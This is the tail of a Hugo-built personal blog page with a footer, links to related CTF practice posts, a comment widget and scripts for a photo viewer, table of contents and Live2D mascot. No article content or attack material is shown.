    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/%E5%88%B7%E9%A2%98/">Âà∑È¢ò</a>
        
    </section>


    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under 9u_l3</span>
    </section>
    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">Áõ∏ÂÖ≥ÊñáÁ´†</h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="has-image">
    <a href="/p/buuctf%E5%88%B7%E9%A2%98/">
        
        
            <div class="article-image">
                <img src="/p/buuctf%E5%88%B7%E9%A2%98/1.9cee2f631ea8b1b22f42f7b318775325.webp" 
                        width="1920" 
                        height="1080" 
                        loading="lazy"
                        alt="Featured image of post buuctfÂà∑È¢ò"
                        
                        data-hash="md5-nO4vYx6osbIvQvezGHdTJQ==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">buuctfÂà∑È¢ò</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/7.10bugkuawd/">
        
        
            <div class="article-image">
                <img src="/p/7.10bugkuawd/1.9cee2f631ea8b1b22f42f7b318775325.webp" 
                        width="1920" 
                        height="1080" 
                        loading="lazy"
                        alt="Featured image of post 7.10bugkuawd"
                        
                        data-hash="md5-nO4vYx6osbIvQvezGHdTJQ==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">7.10bugkuawd</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/">
        
        
            <div class="article-image">
                <img src="/p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/1.36b7be2aa84abef312bd7b8ca3fd18f0.png" 
                        width="1216" 
                        height="832" 
                        loading="lazy"
                        alt="Featured image of post ÁéÑÊú∫ÊâìÈù∂Êó•ËÆ∞"
                        
                        data-hash="md5-Nre&#43;KqhKvvMSvXuMo/0Y8A==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">ÁéÑÊú∫ÊâìÈù∂Êó•ËÆ∞</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/thm%E6%97%A5%E8%AE%B0/">
        
        
            <div class="article-image">
                <img src="/p/thm%E6%97%A5%E8%AE%B0/1.9349c37f2956be9c3933760456845267.webp" 
                        width="2048" 
                        height="1536" 
                        loading="lazy"
                        alt="Featured image of post thmÊó•ËÆ∞"
                        
                        data-hash="md5-k0nDfylWvpw5M3YEVoRSZw==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">thmÊó•ËÆ∞</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <script src='//unpkg.com/@waline/client@v2/dist/waline.js'></script>
<link href='//unpkg.com/@waline/client@v2/dist/waline.css' rel='stylesheet'/>
<div id="waline" class="waline-container"></div>
<style>
    .waline-container {
        background-color: var(--card-background);
        border-radius: var(--card-border-radius);
        box-shadow: var(--shadow-l1);
        padding: var(--card-padding);
        --waline-font-size: var(--article-font-size);
    }
    .waline-container .wl-count {
        color: var(--card-text-color-main);
    }
</style><script>
    
    Waline.init({"dark":"html[data-scheme=\"dark\"]","el":"#waline","emoji":["https://unpkg.com/@waline/emojis@1.0.1/weibo"],"locale":{"admin":"Admin","placeholder":null},"requiredMeta":["name","email","url"],"serverURL":"https://waline-test-one-smoky.vercel.app"});
</script>

    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
        2025 Êó†ÊïåÂèØÁà±ÁæéÂíïÂôú
    </section>
    
    <section class="powerby">
        ‰ΩøÁî® <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> ÊûÑÂª∫ <br />
        ‰∏ªÈ¢ò <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> Áî± <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> ËÆæËÆ°
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

<style>
  body {
    background: url(https://0d000721999.github.io/background/1.webp) no-repeat center top;
    background-size: cover;
    background-attachment: fixed;
  }
</style>

 
<style>
  @font-face {
    font-family: 'ss';
    src: url(https://0d000721999.github.io/font/SeriousShannsNerdFontMono-Regular.otf) format('opentype');
  }

  :root {
    --base-font-family: 'ss';
    --code-font-family: 'ss';
  }
</style>
<style>
    #TableOfContents > ul, ol {
        ul, ol {
            display: none;
        }
        .open {
            display: block;
        }
    }
</style>

<script>
    function initTocHide() {
        
        let toc = document.querySelector(".widget--toc");
        if (!toc) {
            return;
        }
        
        window.addEventListener('scroll', function() {
            
            let openUl = document.querySelectorAll(".open");
            if (openUl.length > 0) {
              openUl.forEach((ul) => {
                ul.classList.remove("open")
              })
            }
            
            let currentLi = document.querySelector(".active-class");
            if (!currentLi) {
                return
            }
            
            if (currentLi.children.length > 1) {
                currentLi.children[1].classList.add("open")
            }
            
            let ul = currentLi.parentElement;
            do {
                ul.classList.add("open");
                ul = ul.parentElement.parentElement
            } while (ul !== undefined && (ul.localName === 'ul' || ul.localName === 'ol'))
        });
    }
    initTocHide()
</script>

<style>
    #backTopBtn {
        display: none;
        position: fixed;
        bottom: 30px;
        z-index: 99;
        cursor: pointer;
        width: 30px;
        height: 30px;
        background-image: url(https://0d000721999.github.io/icons/backTop.svg);
    }
</style>

<script>
    

    function initScrollTop() {
        let rightSideBar = document.querySelector(".right-sidebar");
        if (!rightSideBar) {
            return;
        }
        
        let btn = document.createElement("div");
        btn.id = "backTopBtn";
        btn.onclick = backToTop
        rightSideBar.appendChild(btn)
        
        window.onscroll = function() {
            
            if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
                btn.style.display = "block";
            } else {
                btn.style.display = "none";
            }
        };
    }

    

    function backToTop(){
        window.scrollTo({ top: 0, behavior: "smooth" })
    }

    initScrollTop();
</script>


<script>   
  const cdnPath = "https://cdn.jsdelivr.net/gh/0d000721999/live2d-test@f09405fd";
  const cssPath = "https://0d000721999.github.io/waifu/waifu.css"
  const config = {
    
    path: {
      homePath: "/",
      modelPath: cdnPath + "/Resources/",
      cssPath: cssPath,
      tipsJsonPath: cdnPath + "/waifu-tips.json",
      tipsJsPath: cdnPath + "/waifu-tips.js",
      live2dCorePath: cdnPath + "/Core/live2dcubismcore.js",
      live2dSdkPath: cdnPath + "/live2d-sdk.js"
    },
    
    tools: ["hitokoto", "asteroids", "express","photo", "quit"],
    
    drag: {
      enable: true,
      direction: ["x", "y"]
    },
    
    switchType: "order"
  }

  
  if (screen.width >= 768) {
    Promise.all([
      loadExternalResource(config.path.cssPath, "css"),
      loadExternalResource(config.path.live2dCorePath, "js"),
      loadExternalResource(config.path.live2dSdkPath, "js"),
      loadExternalResource(config.path.tipsJsPath, "js")
    ]).then(() => {
      initWidget({
        waifuPath: config.path.tipsJsonPath,
        cdnPath: config.path.modelPath,
        tools: config.tools,
        dragEnable: config.drag.enable,
        dragDirection: config.drag.direction,
        switchType: config.switchType
      });
    });
  }

  
  function loadExternalResource(url, type) {
    return new Promise((resolve, reject) => {
      let tag;
      if (type === "css") {
        tag = document.createElement("link");
        tag.rel = "stylesheet";
        tag.href = url;
      }
      else if (type === "js") {
        tag = document.createElement("script");
        tag.src = url;
      }
      if (tag) {
        tag.onload = () => resolve(url);
        tag.onerror = () => reject(url);
        document.head.appendChild(tag);
      }
    });
  }
</script>

    </body>
</html>
